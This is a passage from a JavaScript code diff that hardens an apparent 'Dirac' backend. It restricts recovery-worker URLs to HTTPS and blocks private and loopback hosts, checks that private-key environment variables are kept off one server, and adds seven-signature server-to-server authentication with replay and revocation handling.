+const DIRAC_RECOVERY_WORKER_DEFAULT_PATH_V201 = '/api/health';
+const DIRAC_SERVER1_FORBIDDEN_PRIVATE_ENVS_V201 = Object.freeze([
+  'DIRAC_CENTRAL_VERCEL2_ACTIONS_ENABLED',
+  'DIRAC_VERCEL2_ACTIONS_ENABLED',
+  'DIRAC_CENTRAL_VERCEL2_ONLY_ACTIONS',
+  'DIRAC_VERCEL2_ONLY_ACTIONS',
+  'DIRAC_RECOVERY_WORKER_ALLOWED_CALLER',
+  'DIRAC_RECOVERY_WORKER_MAX_BODY_BYTES',
+  'DIRAC_RECOVERY_WORKER_CLOCK_SKEW_SECONDS',
+  'DIRAC_RECOVERY_WORKER_X25519_PRIVATE_KEY',
+  'DIRAC_RECOVERY_WORKER_MLKEM1024_PRIVATE_KEY',
+  'DIRAC_LOST_PASSKEY_ARGON2_MEMORY_KIB',
+  'DIRAC_LOST_PASSKEY_ARGON2_TIME_COST',
+  'DIRAC_LOST_PASSKEY_ARGON2_PARALLELISM',
+  'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_MEMORY_KIB',
+  'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_TIME_COST',
+  'DIRAC_LOST_PASSKEY_LINK_OPEN_ARGON2_PARALLELISM',
+  'DIRAC_LOST_PASSKEY_ROOT_SECRET',
+  'DIRAC_LOST_PASSKEY_ROOT_SECRET_VERSION',
+  'DIRAC_LOST_PASSKEY_DB_PEPPER',
+  'DIRAC_LOST_PASSKEY_MAX_RUNNING',
+  'DIRAC_LOST_PASSKEY_QUEUE_MAX',
+  'DIRAC_LOST_PASSKEY_PROCESSING_LOCK_TTL_SECONDS',
+  'DIRAC_LOST_PASSKEY_QUEUE_DISABLED',
+  'DIRAC_LOST_PASSKEY_QUEUE_LOCK_TTL_SECONDS',
+  'DIRAC_LOST_PASSKEY_QUEUE_MAX_WAIT_SECONDS',
+  'DIRAC_LOST_PASSKEY_QUEUE_POLL_MS',
+  'DIRAC_RECOVERY_SERVER1_URL',
+  'DIRAC_RECOVERY_SERVER1_SERVER_ID',
+  'DIRAC_RECOVERY_HPKE_PRIVATE_KEY',
+  'DIRAC_RECOVERY_HPKE_KEY_ID',
+  'DIRAC_RECOVERY_HPKE_PEPPER',
+  'DIRAC_RECOVERY_HPKE_PEPPER_KEY_ID',
+  'DIRAC_RECOVERY_HPKE_ARGON2_MEMORY_KIB',
+  'DIRAC_RECOVERY_HPKE_ARGON2_TIME_COST',
+  'DIRAC_RECOVERY_MLKEM1024_PRIVATE_KEY_PEM',
+  'DIRAC_RECOVERY_MLKEM1024_PRIVATE_KEY_DER_B64',
+  'DIRAC_RECOVERY_MLDSA87_PRIVATE_KEY_PEM',
+  'DIRAC_RECOVERY_MLDSA87_PRIVATE_KEY_DER_B64',
+  'DIRAC_LOST_PASSKEY_ED25519_PRIVATE_KEY',
+  'DIRAC_LOST_PASSKEY_ED25519_PRIVATE_KEY_PEM'
+]);
+
+function diracRecoveryWorkerConfiguredPathV201() {
+  const raw = String(process.env.DIRAC_RECOVERY_WORKER_PATH || DIRAC_RECOVERY_WORKER_DEFAULT_PATH_V201).trim();
+  if (!/^\/[A-Za-z0-9._~!$&'()*+,;=:@%/-]{1,240}$/.test(raw) || raw.includes('//') || raw.includes('..')) {
+    return '';
+  }
+  return raw.replace(/\/+$/, '') || '/';
+}
+
+function diracRecoveryWorkerHostSafeV201(hostname) {
+  const host = String(hostname || '').trim().toLowerCase().replace(/\.$/, '');
+  if (!host || host === 'localhost' || host.endsWith('.localhost') || host.endsWith('.local')) return false;
+  if (/^(?:0|127|10|192\.168|169\.254)\./.test(host)) return false;
+  const ipv4 = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+  if (ipv4) {
+    const octets = ipv4.slice(1).map(Number);
+    if (octets.some((item) => item < 0 || item > 255)) return false;
+    if (octets[0] === 172 && octets[1] >= 16 && octets[1] <= 31) return false;
+    if (octets[0] === 100 && octets[1] >= 64 && octets[1] <= 127) return false;
+    if (octets[0] >= 224) return false;
+  }
+  if (host.includes(':')) return false;
+  return /^[a-z0-9](?:[a-z0-9.-]{0,251}[a-z0-9])?$/.test(host);
+}
+
+const __diracRecoveryWorkerUrlBeforeV201 = customerSecurityRecoveryWorkerUrl;
+customerSecurityRecoveryWorkerUrl = function customerSecurityRecoveryWorkerUrlV201() {
+  const raw = String(process.env.DIRAC_RECOVERY_WORKER_URL || '').trim();
+  const expectedHost = String(process.env.DIRAC_RECOVERY_WORKER_EXPECTED_HOST || '').trim().toLowerCase().replace(/\.$/, '');
+  const expectedPath = diracRecoveryWorkerConfiguredPathV201();
+  if (!raw || !expectedPath) return '';
+  try {
+    const target = new URL(raw);
+    const host = String(target.hostname || '').toLowerCase().replace(/\.$/, '');
+    if (target.protocol !== 'https:'
+        || (target.port && target.port !== '443')
+        || target.username
+        || target.password
+        || target.search
+        || target.hash
+        || !diracRecoveryWorkerHostSafeV201(host)
+        || target.pathname.replace(/\/+$/, '') !== expectedPath
+        || (expectedHost && host !== expectedHost)) {
+      return '';
+    }
+    if (process.env.NODE_ENV === 'production' && !expectedHost) return '';
+    return `https://${host}${target.port ? ':' + target.port : ''}${expectedPath}`;
+  } catch (_) {
+    return '';
+  }
+};
+Object.defineProperty(customerSecurityRecoveryWorkerUrl, '__diracServer1BoundaryV201', { value: true, enumerable: false });
+
+const __diracRecoveryWorkerSignBeforeV201 = customerSecurityRecoveryWorkerSign;
+customerSecurityRecoveryWorkerSign = function customerSecurityRecoveryWorkerSignV201(caller, timestamp, canonicalBody) {
+  const path = diracRecoveryWorkerConfiguredPathV201();
+  const secret = customerSecurityRecoveryWorkerSecret();
+  if (!path || !secret) return '';
+  return crypto.createHmac('sha512', secret)
+    .update(DIRAC_RECOVERY_WORKER_AUTH_CONTEXT_V201)
+    .update('\nPOST\n')
+    .update(path)
+    .update('\n')
+    .update(String(caller || ''))
+    .update('\n')
+    .update(String(timestamp || ''))
+    .update('\n')
+    .update(String(canonicalBody || ''))
+    .digest('base64url');
+};
+Object.defineProperty(customerSecurityRecoveryWorkerSign, '__diracServer1BoundaryV201', { value: true, enumerable: false });
+
+function diracAssertServer1RecoveryEnvironmentV201() {
+  const role = String(process.env.DIRAC_CENTRAL_DEPLOYMENT_ROLE || process.env.DIRAC_DEPLOYMENT_ROLE || '').trim().toLowerCase();
+  const isServer2 = role === 'vercel2' || role === 'server2' || role === 'recovery-worker';
+  if (isServer2) throw new Error('DIRAC_SERVER1_DEPLOYMENT_ROLE_INVALID');
+  const leaked = DIRAC_SERVER1_FORBIDDEN_PRIVATE_ENVS_V201.filter((name) => String(process.env[name] || '').trim());
+  if (leaked.length) throw new Error('DIRAC_SERVER1_PRIVATE_ENV_PARTITION_FAILED');
+  return true;
+}
+
+diracAssertServer1RecoveryEnvironmentV201();
+
+if (typeof module === 'undefined'
+    || typeof __diracV202DispatcherSentinel !== 'function'
+    || __diracV202DispatcherSentinel.__diracCentralSecurityGuardV146 !== true) {
+  throw new Error('DIRAC_SERVER1_FINAL_CENTRAL_GUARD_REQUIRED_V201');
+}
+__diracV202MarkWrapperFlag("__diracServer1RecoveryBoundaryV201");
+
+
+/* ============================================================
+   DIRAC INTERNAL SERVER MESH v209 - NARROW SECURITY-DB SPLIT
+   - Applies only to internal server-to-server actions.
+   - Every internal request requires seven independent asymmetric signatures.
+   - One missing/invalid signature rejects before the business handler.
+   - Attributed failures revoke offender server_id + key_version persistently.
+   - Registry, replay, revocation, bans, and security_report use the dedicated security DB.
+   - security_report and revocation checks remain inside Central Guard.
+   - Existing browser, login, payment, email, A2F/MFA, Argon2id, and endpoints
+     remain unchanged.
+   ============================================================ */
+const DIRAC_S2S_VERSION_V206 = 'dirac-s2s-seven-signatures-v1';
+const DIRAC_S2S_POLICY_V206 = 'all-seven-required-fail-closed';
+const DIRAC_S2S_MAX_CLOCK_SKEW_MS_V206 = 15_000;
+const DIRAC_S2S_MLDSA_CONTEXT_V206 = Buffer.from('DIRAC-S2S-SEVEN-SIGNATURES-V1', 'utf8');
+const DIRAC_S2S_REVOCATION_MEMORY_V206 = globalThis.__DIRAC_S2S_REVOCATION_MEMORY_V206__ || new Map();
+globalThis.__DIRAC_S2S_REVOCATION_MEMORY_V206__ = DIRAC_S2S_REVOCATION_MEMORY_V206;
+
+function diracS2SStableJsonV206(value) {
+  if (value === null || value === undefined) return 'null';
+  if (typeof value !== 'object') return JSON.stringify(value);
+  if (Array.isArray(value)) return '[' + value.map(diracS2SStableJsonV206).join(',') + ']';
+  return '{' + Object.keys(value).sort().map((key) => JSON.stringify(key) + ':' + diracS2SStableJsonV206(value[key])).join(',') + '}';
+}
+
+function diracS2STextV206(name) {
+  return String(process.env[name] || '').trim();
+}
+
+const DIRAC_S2S_ENV_JSON_CACHE_V207 = globalThis.__DIRAC_S2S_ENV_JSON_CACHE_V207__ || new Map();
+globalThis.__DIRAC_S2S_ENV_JSON_CACHE_V207__ = DIRAC_S2S_ENV_JSON_CACHE_V207;
+
+function diracS2SEnvJsonObjectV207(name, required) {
+  const envName = String(name || '').trim();
+  const raw = diracS2STextV206(envName);
+  if (!raw) return required
+    ? { ok: false, unavailable: true, reason: envName + '_missing', value: null }
+    : { ok: true, value: Object.freeze({}), source: 'environment' };
+  const cached = DIRAC_S2S_ENV_JSON_CACHE_V207.get(envName);
+  if (cached && cached.raw === raw) return cached.result;
+  let parsed;
+  try { parsed = JSON.parse(raw); }
+  catch (_) {
+    const result = { ok: false, unavailable: true, reason: envName + '_invalid_json', value: null };
+    DIRAC_S2S_ENV_JSON_CACHE_V207.set(envName, { raw, result });
+    return result;
+  }
+  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
+    const result = { ok: false, unavailable: true, reason: envName + '_invalid_object', value: null };
+    DIRAC_S2S_ENV_JSON_CACHE_V207.set(envName, { raw, result });
+    return result;
+  }
+  const result = { ok: true, value: parsed, source: 'environment' };
+  DIRAC_S2S_ENV_JSON_CACHE_V207.set(envName, { raw, result });
+  return result;
+}
+
+function diracS2SValidateEnvRegistryV207(registry) {
+  if (!registry || typeof registry !== 'object' || Array.isArray(registry) || Object.keys(registry).length === 0) return false;
+  const signatureNames = diracS2SSignatureSpecsV206().map((spec) => spec.name);
+  for (const [serverId, entry] of Object.entries(registry)) {
+    if (diracS2SIdV206(serverId) !== serverId || !entry || typeof entry !== 'object' || Array.isArray(entry)) return false;
+    if (!['active', 'revoked'].includes(String(entry.status || '').trim().toLowerCase())) return false;
+    if (!diracS2SKeyVersionV206(entry.key_version)) return false;
+    if (!Array.isArray(entry.allowed_targets) || !entry.allowed_targets.length || entry.allowed_targets.some((item) => !diracS2SIdV206(item))) return false;
+    if (!Array.isArray(entry.allowed_actions) || !entry.allowed_actions.length || entry.allowed_actions.some((item) => !/^[a-z0-9_-]{1,80}$/.test(String(item || '').trim()))) return false;
+    const publicKeys = entry.public_keys;
+    if (!publicKeys || typeof publicKeys !== 'object' || Array.isArray(publicKeys)) return false;
+    if (signatureNames.some((name) => !String(publicKeys[name] || '').trim())) return false;
+  }
+  return true;
+}
+
+function diracS2SEnvRevocationStatusV207(serverId, keyVersion) {
+  const cleanServerId = diracS2SIdV206(serverId);
+  const cleanKeyVersion = diracS2SKeyVersionV206(keyVersion);
+  if (!cleanServerId || !cleanKeyVersion) return { ok: false, unavailable: true, reason: 'env_revocation_identity_invalid', revoked: false };
+  const parsed = diracS2SEnvJsonObjectV207('DIRAC_S2S_REVOKED_KEYS_JSON', false);
+  if (!parsed.ok) return { ok: false, unavailable: true, reason: 'env_revocation_json_invalid', revoked: false };
+  const configured = parsed.value[cleanServerId];
+  if (configured === undefined) return { ok: true, revoked: false, source: 'environment' };
+  if (!Array.isArray(configured) || configured.some((item) => !diracS2SKeyVersionV206(item))) {
+    return { ok: false, unavailable: true, reason: 'env_revocation_entry_invalid', revoked: false };
+  }
+  return { ok: true, revoked: configured.includes(cleanKeyVersion), source: 'environment' };
+}
+
+
+function diracS2SIdV206(value) {
+  const clean = String(value || '').trim().toLowerCase();
+  return /^[a-z0-9](?:[a-z0-9_.-]{0,78}[a-z0-9])?$/.test(clean) ? clean : '';
+}
+
+function diracS2SKeyVersionV206(value) {
+  const clean = String(value || '').trim();
+  return /^[A-Za-z0-9_.-]{1,80}$/.test(clean) ? clean : '';
+}
+
+function diracS2SHeaderV206(req, name) {
+  const headers = req && req.headers && typeof req.headers === 'object' ? req.headers : {};
+  const value = headers[String(name || '').toLowerCase()];
+  return Array.isArray(value) ? String(value[0] || '').trim() : String(value || '').trim();
+}
+
+function diracS2SPathV206(input) {
+  try {
+    if (input instanceof URL) return input.pathname.replace(/\/+$/, '') || '/';
+    const raw = String(input && input.url || input || '/api/health');
+    return new URL(raw, 'https://dirac.invalid').pathname.replace(/\/+$/, '') || '/';
+  } catch (_) {
+    return '/api/health';
+  }
+}
+
+function diracS2SBodyHashV206(body) {
+  return crypto.createHash('sha512').update(diracS2SStableJsonV206(body && typeof body === 'object' ? body : {}), 'utf8').digest('hex');
+}
+
+function diracS2SCanonicalV206(meta) {
+  return Buffer.from([
+    DIRAC_S2S_VERSION_V206,
+    String(meta.networkId || ''),
+    String(meta.serverId || ''),
+    String(meta.targetServerId || ''),
+    String(meta.keyVersion || ''),
+    String(meta.method || '').toUpperCase(),
+    String(meta.path || ''),
+    String(meta.action || ''),
+    String(meta.timestamp || ''),
+    String(meta.nonce || ''),
+    String(meta.requestId || ''),
+    String(meta.bodyHash || '')
+  ].join('\n'), 'utf8');
+}
+
+function diracS2SKeyObjectV206(raw, kind, expectedType) {
+  const clean = String(raw || '').trim();
+  if (!clean) throw new Error('DIRAC_S2S_KEY_MISSING_' + kind);
+  const material = clean.includes('-----BEGIN') ? clean.replace(/\\n/g, '\n') : Buffer.from(clean, 'base64');
+  const key = kind === 'private' ? crypto.createPrivateKey(material) : crypto.createPublicKey(material);
+  if (expectedType && key.asymmetricKeyType !== expectedType) throw new Error('DIRAC_S2S_KEY_TYPE_INVALID_' + expectedType);
+  if (expectedType === 'rsa') {
+    const modulusLength = Number(key && key.asymmetricKeyDetails && key.asymmetricKeyDetails.modulusLength || 0);
+    if (!Number.isSafeInteger(modulusLength) || modulusLength < 3072) {
+      throw new Error('DIRAC_S2S_RSA_MODULUS_TOO_SMALL');
+    }
+  }
+  return key;
+}
+
+function diracS2SDecodeSignatureV210(raw) {
+  const encoded = String(raw || '');
+  if (!/^[A-Za-z0-9_-]{40,22000}$/.test(encoded)) throw new Error('DIRAC_S2S_SIGNATURE_FORMAT_INVALID');
+  const signature = Buffer.from(encoded, 'base64url');
+  if (!signature.length || signature.toString('base64url') !== encoded) {
+    signature.fill(0);
+    throw new Error('DIRAC_S2S_SIGNATURE_ENCODING_NON_CANONICAL');
+  }
+  return signature;
+}
+
+function diracS2SSignatureSpecsV206() {
+  return Object.freeze([
+    Object.freeze({ index: 1, name: 'ed25519', type: 'ed25519', privateEnv: 'DIRAC_S2S_ED25519_PRIVATE_KEY_PEM', sign: (message, key) => crypto.sign(null, message, key), verify: (message, key, signature) => crypto.verify(null, message, key, signature) }),
+    Object.freeze({ index: 2, name: 'ed448', type: 'ed448', privateEnv: 'DIRAC_S2S_ED448_PRIVATE_KEY_PEM', sign: (message, key) => crypto.sign(null, message, key), verify: (message, key, signature) => crypto.verify(null, message, key, signature) }),
+    Object.freeze({ index: 3, name: 'ecdsa_p256', type: 'ec', privateEnv: 'DIRAC_S2S_ECDSA_P256_PRIVATE_KEY_PEM', curve: 'prime256v1', sign: (message, key) => crypto.sign('sha256', message, { key, dsaEncoding: 'ieee-p1363' }), verify: (message, key, signature) => crypto.verify('sha256', message, { key, dsaEncoding: 'ieee-p1363' }, signature) }),
+    Object.freeze({ index: 4, name: 'ecdsa_p384', type: 'ec', privateEnv: 'DIRAC_S2S_ECDSA_P384_PRIVATE_KEY_PEM', curve: 'secp384r1', sign: (message, key) => crypto.sign('sha384', message, { key, dsaEncoding: 'ieee-p1363' }), verify: (message, key, signature) => crypto.verify('sha384', message, { key, dsaEncoding: 'ieee-p1363' }, signature) }),
+    Object.freeze({ index: 5, name: 'ecdsa_p521', type: 'ec', privateEnv: 'DIRAC_S2S_ECDSA_P521_PRIVATE_KEY_PEM', curve: 'secp521r1', sign: (message, key) => crypto.sign('sha512', message, { key, dsaEncoding: 'ieee-p1363' }), verify: (message, key, signature) => crypto.verify('sha512', message, { key, dsaEncoding: 'ieee-p1363' }, signature) }),
+    Object.freeze({ index: 6, name: 'rsa_pss_sha512', type: 'rsa', privateEnv: 'DIRAC_S2S_RSA_PSS_PRIVATE_KEY_PEM', sign: (message, key) => crypto.sign('sha512', message, { key, padding: crypto.constants.RSA_PKCS1_PSS_PADDING, saltLength: 64 }), verify: (message, key, signature) => crypto.verify('sha512', message, { key, padding: crypto.constants.RSA_PKCS1_PSS_PADDING, saltLength: 64 }, signature) }),
+    Object.freeze({ index: 7, name: 'ml_dsa_87', type: 'ml-dsa-87', privateEnv: 'DIRAC_S2S_MLDSA87_PRIVATE_KEY_PEM', sign: (message, key) => crypto.sign(null, message, { key, context: DIRAC_S2S_MLDSA_CONTEXT_V206 }), verify: (message, key, signature) => crypto.verify(null, message, { key, context: DIRAC_S2S_MLDSA_CONTEXT_V206 }, signature) })
+  ]);
+}
+
+function diracS2SAssertEcCurveV206(key, expectedCurve) {
+  if (!expectedCurve) return true;
+  const details = key && key.asymmetricKeyDetails || {};
+  const curve = String(details.namedCurve || '').toLowerCase();
+  const accepted = expectedCurve === 'prime256v1' ? new Set(['prime256v1', 'secp256r1']) : new Set([expectedCurve]);
+  if (!accepted.has(curve)) throw new Error('DIRAC_S2S_EC_CURVE_INVALID_' + expectedCurve);
+  return true;
+}
+
+function diracS2SAssertConfigurationV206() {
+  const serverId = diracS2SIdV206(diracS2STextV206('DIRAC_S2S_SERVER_ID'));
+  const keyVersion = diracS2SKeyVersionV206(diracS2STextV206('DIRAC_S2S_KEY_VERSION'));
+  const networkId = diracS2STextV206('DIRAC_S2S_NETWORK_ID');
+  if (!serverId || !keyVersion) throw new Error('DIRAC_S2S_CONFIGURATION_IDENTITY_INVALID');
+  if (!/^[A-Za-z0-9_-]{43,256}$/.test(networkId)) throw new Error('DIRAC_S2S_NETWORK_ID_INVALID');
+  if (DIRAC_S2S_SECURITY_TABLE !== 'dirac_s2s_security') throw new Error('DIRAC_S2S_SECURITY_TABLE_REQUIRED');
+  readDiracSupabaseCredentials('security');
+  const revoked = diracS2SEnvJsonObjectV207('DIRAC_S2S_REVOKED_KEYS_JSON', false);
+  if (!revoked.ok) throw new Error('DIRAC_S2S_REVOKED_KEYS_JSON_INVALID');
+  for (const [revokedServerId, versions] of Object.entries(revoked.value)) {
+    if (diracS2SIdV206(revokedServerId) !== revokedServerId
+        || !Array.isArray(versions)
+        || versions.some((item) => !diracS2SKeyVersionV206(item))) {
+      throw new Error('DIRAC_S2S_REVOKED_KEYS_JSON_INVALID');
+    }
+  }
+  for (const spec of diracS2SSignatureSpecsV206()) {
+    const key = diracS2SKeyObjectV206(diracS2STextV206(spec.privateEnv), 'private', spec.type);
+    diracS2SAssertEcCurveV206(key, spec.curve);
+  }
+  return true;
+}
+
+async function diracS2SRegistryEntryV206(serverId) {
+  const cleanServerId = diracS2SIdV206(serverId);
+  if (!cleanServerId) return { ok: true, found: false, entry: null, source: 'security_database_registry' };
+  if (typeof readPersistentSecurityJsonStrictV194 !== 'function') {
+    return { ok: false, found: false, entry: null, unavailable: true, source: 'security_database_registry' };
+  }
+  const lookup = await readPersistentSecurityJsonStrictV194('s2s-server-registry:' + cleanServerId);
+  if (!lookup || lookup.ok !== true) {
+    return { ok: false, found: false, entry: null, unavailable: true, source: 'security_database_registry' };
+  }
+  if (!lookup.found) return { ok: true, found: false, entry: null, source: 'security_database_registry' };
+  const record = lookup.record && typeof lookup.record === 'object' && !Array.isArray(lookup.record) ? lookup.record : null;
+  const entry = record && record.entry && typeof record.entry === 'object' && !Array.isArray(record.entry)
+    ? record.entry
+    : record;
+  if (!entry || !diracS2SValidateEnvRegistryV207({ [cleanServerId]: entry })) {
+    return { ok: false, found: false, entry: null, unavailable: true, source: 'security_database_registry' };
+  }
+  return { ok: true, found: true, entry, source: 'security_database_registry' };
+}
+
+function diracS2SSignHeadersV206(input) {
+  const target = input && input.target instanceof URL ? input.target : new URL(String(input && input.target || ''));
+  const action = String(input && input.action || '').trim().toLowerCase();
+  const body = input && input.body && typeof input.body === 'object' ? input.body : {};
+  const serverId = diracS2SIdV206(diracS2STextV206('DIRAC_S2S_SERVER_ID'));
+  const targetServerId = diracS2SIdV206(input && input.targetServerId || '');
+  const keyVersion = diracS2SKeyVersionV206(diracS2STextV206('DIRAC_S2S_KEY_VERSION'));
+  const networkId = diracS2STextV206('DIRAC_S2S_NETWORK_ID');
+  if (!serverId || !targetServerId || !keyVersion || !action || !/^[A-Za-z0-9_-]{43,256}$/.test(networkId)) throw new Error('DIRAC_S2S_SIGNING_IDENTITY_INVALID');
+  const timestamp = String(Date.now());
+  const nonce = crypto.randomBytes(32).toString('base64url');
+  const requestId = crypto.randomBytes(24).toString('base64url');
+  const bodyHash = diracS2SBodyHashV206(body);
+  const message = diracS2SCanonicalV206({ networkId, serverId, targetServerId, keyVersion, method: 'POST', path: diracS2SPathV206(target), action, timestamp, nonce, requestId, bodyHash });
+  const headers = {
+    'X-Dirac-S2S-Version': DIRAC_S2S_VERSION_V206,
+    'X-Dirac-S2S-Policy': DIRAC_S2S_POLICY_V206,
+    'X-Dirac-Server-Id': serverId,
+    'X-Dirac-Target-Server-Id': targetServerId,
+    'X-Dirac-Key-Version': keyVersion,
+    'X-Dirac-Timestamp': timestamp,
+    'X-Dirac-Nonce': nonce,
+    'X-Dirac-Request-Id': requestId,
+    'X-Dirac-Body-SHA512': bodyHash
+  };
+  headers['X-Dirac-Network-Id'] = networkId;
+  try {
+    for (const spec of diracS2SSignatureSpecsV206()) {
+      const key = diracS2SKeyObjectV206(diracS2STextV206(spec.privateEnv), 'private', spec.type);
+      diracS2SAssertEcCurveV206(key, spec.curve);
+      const signature = spec.sign(message, key);
+      headers['X-Dirac-Signature-' + spec.index] = Buffer.from(signature).toString('base64url');
+      if (Buffer.isBuffer(signature)) signature.fill(0);
+    }
+    return headers;
+  } finally {
+    message.fill(0);
+  }
+}
+
+function diracS2SIsInternalActionV206(ctx) {
+  return Boolean(ctx && ctx.classification === 'server' && ctx.action !== 'midtrans_webhook');
+}
+
+function diracS2SRevocationKeyV206(serverId, keyVersion) {
+  return 's2s-revocation:' + diracS2SIdV206(serverId) + ':' + diracS2SKeyVersionV206(keyVersion);
+}
+
+async function diracS2SCheckRevocationLocalV206(serverId, keyVersion) {
+  const key = diracS2SRevocationKeyV206(serverId, keyVersion);
+  if (!key || /::$/.test(key)) return { ok: false, unavailable: true, reason: 'revocation_identity_invalid' };
+  const envStatus = diracS2SEnvRevocationStatusV207(serverId, keyVersion);
+  if (!envStatus.ok) return { ok: false, unavailable: true, reason: envStatus.reason || 'env_revocation_unavailable' };
+  if (envStatus.revoked === true) return { ok: true, revoked: true, record: { source: 'environment', revoked: true } };
+  const memory = DIRAC_S2S_REVOCATION_MEMORY_V206.get(key);
+  if (memory && memory.revoked === true) return { ok: true, revoked: true, record: memory };
+  if (typeof readPersistentSecurityJsonStrictV194 !== 'function') return { ok: false, unavailable: true, reason: 'revocation_store_unavailable' };
+  const lookup = await readPersistentSecurityJsonStrictV194(key);
+  if (!lookup || lookup.ok !== true) return { ok: false, unavailable: true, reason: 'revocation_store_unavailable' };
+  const record = lookup.record && typeof lookup.record === 'object' ? lookup.record : null;
+  const revoked = Boolean(lookup.found && record && record.revoked === true);
+  if (revoked) DIRAC_S2S_REVOCATION_MEMORY_V206.set(key, record);
+  return { ok: true, revoked, record };
+}
+
+async function diracS2SApplyRevocationV206(evidence) {
+  const serverId = diracS2SIdV206(evidence && evidence.offender_server_id);
+  const keyVersion = diracS2SKeyVersionV206(evidence && evidence.offender_key_version);
+  const key = diracS2SRevocationKeyV206(serverId, keyVersion);
+  if (!serverId || !keyVersion || !key) return false;
+  const now = Date.now();
+  const blockedUntilMs = now + diracCentralBlockMsV146();
+  const record = {
+    type: 'dirac_s2s_key_revocation_v206',
+    revoked: true,
+    offender_server_id: serverId,
+    offender_key_version: keyVersion,
+    incident_id: String(evidence && evidence.incident_id || '').slice(0, 160),
+    evidence_hash: String(evidence && evidence.evidence_hash || '').slice(0, 128),
+    failure_code: String(evidence && evidence.failure_code || '').slice(0, 120),
+    failed_signature_indexes: Array.isArray(evidence && evidence.failed_signature_indexes) ? evidence.failed_signature_indexes.slice(0, 7).map(Number) : [],
+    attributed_valid_signature_count: Math.max(0, Math.min(7, Number(evidence && evidence.attributed_valid_signature_count || 0))),
+    revoked_at: new Date(now).toISOString(),
+    blocked_until_ms: blockedUntilMs
+  };
+  if (typeof writePersistentSecurityJsonRequiredV194 !== 'function') return false;
+  const wrote = await writePersistentSecurityJsonRequiredV194(key, record, blockedUntilMs, Math.ceil(diracCentralBlockMsV146() / 1000));
+  if (wrote === true) DIRAC_S2S_REVOCATION_MEMORY_V206.set(key, record);
+  return wrote === true;
+}
+
+function diracS2SEvidenceV206(ctx, verification, failureCode) {
+  const incidentId = 'S2S-' + crypto.randomBytes(18).toString('base64url');
+  const evidence = {
+    version: DIRAC_S2S_VERSION_V206,
+    incident_id: incidentId,
+    reporter_server_id: diracS2SIdV206(diracS2STextV206('DIRAC_S2S_SERVER_ID')),
+    reporter_key_version: diracS2SKeyVersionV206(diracS2STextV206('DIRAC_S2S_KEY_VERSION')),
+    offender_server_id: diracS2SIdV206(verification && verification.serverId),
+    offender_key_version: diracS2SKeyVersionV206(verification && verification.keyVersion),
+    target_server_id: diracS2SIdV206(verification && verification.targetServerId),
+    original_request_id: String(verification && verification.requestId || '').slice(0, 160),
+    original_nonce: String(verification && verification.nonce || '').slice(0, 160),
+    original_body_sha512: String(verification && verification.bodyHash || '').slice(0, 128),
+    failure_code: String(failureCode || verification && verification.reason || 'seven_signature_invalid').slice(0, 120),
+    failed_signature_indexes: Array.isArray(verification && verification.failures) ? verification.failures.slice(0, 7).map(Number) : [],
+    attributed_valid_signature_count: Math.max(0, Math.min(7, Number(verification && verification.validCount || 0))),
+    detected_at_ms: Date.now(),
+    action: String(ctx && ctx.action || '').slice(0, 80),
+    method: String(ctx && ctx.method || '').slice(0, 12),
+    path: diracS2SPathV206(ctx && ctx.req)
+  };
+  evidence.evidence_hash = crypto.createHash('sha512').update(diracS2SStableJsonV206(evidence), 'utf8').digest('hex');
+  return evidence;
+}
+
+async function diracS2SHandleInboundFailureV206(ctx, verification, failureCode) {
+  const evidence = diracS2SEvidenceV206(ctx, verification, failureCode);
+  ctx.__diracS2SIncidentV206 = evidence;
+  if (evidence.attributed_valid_signature_count < 1 || !evidence.offender_server_id || !evidence.offender_key_version) {
+    return { ok: false, attributed: false, evidence };
+  }
+  const revoked = await diracS2SApplyRevocationV206(evidence);
+  return { ok: false, attributed: true, revoked, evidence };
+}
+
+async function diracS2SVerifyInboundV206(req, ctx) {
+  const serverId = diracS2SIdV206(diracS2SHeaderV206(req, 'x-dirac-server-id'));
+  const targetServerId = diracS2SIdV206(diracS2SHeaderV206(req, 'x-dirac-target-server-id'));
+  const localServerId = diracS2SIdV206(diracS2STextV206('DIRAC_S2S_SERVER_ID'));
+  const suppliedNetworkId = diracS2SHeaderV206(req, 'x-dirac-network-id');
+  const expectedNetworkId = diracS2STextV206('DIRAC_S2S_NETWORK_ID');
+  const keyVersion = diracS2SKeyVersionV206(diracS2SHeaderV206(req, 'x-dirac-key-version'));
+  const timestampText = diracS2SHeaderV206(req, 'x-dirac-timestamp');
+  const timestamp = Number(timestampText);
+  const nonce = diracS2SHeaderV206(req, 'x-dirac-nonce');
+  const requestId = diracS2SHeaderV206(req, 'x-dirac-request-id');
+  const suppliedBodyHash = diracS2SHeaderV206(req, 'x-dirac-body-sha512').toLowerCase();
+  const base = { ok: false, serverId, targetServerId, keyVersion, timestamp: timestampText, nonce, requestId, bodyHash: suppliedBodyHash, failures: [], validCount: 0 };
+  if (diracS2SHeaderV206(req, 'x-dirac-s2s-version') !== DIRAC_S2S_VERSION_V206 || diracS2SHeaderV206(req, 'x-dirac-s2s-policy') !== DIRAC_S2S_POLICY_V206) return { ...base, reason: 's2s_version_or_policy_invalid' };
+  if (!/^[A-Za-z0-9_-]{43,256}$/.test(expectedNetworkId)
+      || !/^[A-Za-z0-9_-]{43,256}$/.test(suppliedNetworkId)
+      || !(typeof safeEqual === 'function' ? safeEqual(suppliedNetworkId, expectedNetworkId) : suppliedNetworkId === expectedNetworkId)) return { ...base, reason: 's2s_network_id_invalid' };
+  if (!serverId || !targetServerId || !localServerId || targetServerId !== localServerId || !keyVersion) return { ...base, reason: 's2s_identity_binding_invalid' };
+  if (!Number.isSafeInteger(timestamp) || Math.abs(Date.now() - timestamp) > DIRAC_S2S_MAX_CLOCK_SKEW_MS_V206) return { ...base, reason: 's2s_timestamp_invalid' };
+  if (!/^[A-Za-z0-9_-]{32,160}$/.test(nonce) || !/^[A-Za-z0-9_-]{24,160}$/.test(requestId) || !/^[a-f0-9]{128}$/.test(suppliedBodyHash)) return { ...base, reason: 's2s_request_binding_invalid' };
+  const actualBodyHash = diracS2SBodyHashV206(ctx && ctx.body || {});
+  if (!(typeof safeEqual === 'function' ? safeEqual(suppliedBodyHash, actualBodyHash) : suppliedBodyHash === actualBodyHash)) return { ...base, reason: 's2s_body_hash_invalid' };
+  const registryLookup = await diracS2SRegistryEntryV206(serverId);
